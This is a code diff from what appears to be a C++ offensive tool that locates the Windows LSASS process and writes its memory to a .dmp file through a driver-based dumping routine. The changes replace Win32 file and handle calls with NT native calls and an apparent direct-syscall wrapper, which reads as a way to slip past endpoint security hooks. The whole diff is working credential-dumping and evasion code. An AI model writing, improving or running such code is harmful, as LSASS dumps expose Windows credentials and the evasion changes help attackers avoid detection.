@@ -185,7 +185,7 @@ GetLsassPid()
 		} while (Process32Next(hSnapshot, &pe32));
 	}
 
-	CloseHandle(hSnapshot);
+	Utils::NtClose(hSnapshot);
 	return lsassPid;
 }
 
@@ -558,20 +558,39 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 			auto fullPath = currentPath / strDumpFileName;
 			fullPath.replace_extension(".dmp");
 
-			std::string dumpFile = fullPath.string();
+			std::wstring win32Path = fullPath.wstring();
 
-			HANDLE hFile = CreateFileA(dumpFile.c_str(),
-									   GENERIC_WRITE, 
-									   0, 
-									   NULL,
-									   CREATE_ALWAYS,
-									   FILE_ATTRIBUTE_NORMAL, 
-									   NULL);
-			if (INVALID_HANDLE_VALUE == hFile)
+			std::wstring ntPath = L"\\??\\" + win32Path;
+
+			UNICODE_STRING uniPath{};
+			RtlInitUnicodeString(&uniPath, ntPath.c_str());
+
+			OBJECT_ATTRIBUTES objAttr{};
+			InitializeObjectAttributes(&objAttr, &uniPath,
+									   OBJ_CASE_INSENSITIVE,
+									   nullptr, nullptr);
+
+			IO_STATUS_BLOCK ioStatus{};
+			HANDLE hFile{ nullptr };
+
+			NTSTATUS status = SC_NtCreateFile(&hFile,
+											  FILE_GENERIC_WRITE | SYNCHRONIZE | DELETE,
+											  &objAttr,
+											  &ioStatus,
+											  nullptr,
+											  FILE_ATTRIBUTE_NORMAL,
+											  FILE_SHARE_READ | FILE_SHARE_WRITE,
+											  FILE_CREATE,
+											  FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+											  nullptr,
+											  0);
+
+			if (!NT_SUCCESS(status))
 			{
-				LOG("CreateFileA Failed!!!");
+				LOG("[-] SC_NtCreateFile failed: 0x" << std::hex << status << std::dec);
 				break;
 			}
+			
 
 			if (!DriverLoader::DumpLsass(hProcess,
 										 dwPid, 
